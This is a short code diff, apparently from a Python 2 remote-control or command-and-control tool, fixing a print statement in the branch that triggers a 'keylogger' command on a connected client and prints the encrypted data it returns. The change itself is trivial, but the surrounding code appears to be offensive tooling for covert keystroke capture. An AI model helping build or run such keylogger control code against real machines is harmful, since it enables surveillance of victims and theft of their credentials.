@@ -131,7 +131,7 @@ class ClientConnection(common.Client):
 
         # WGET DU KEYLOGGER
         elif cmd in ['keylogger']:
-            print 'Running {}...'.format(wget)
+            print 'Running {}...'.format(cmd)
             recv_data = self.recvGCM().rstrip()
             print recv_data
 
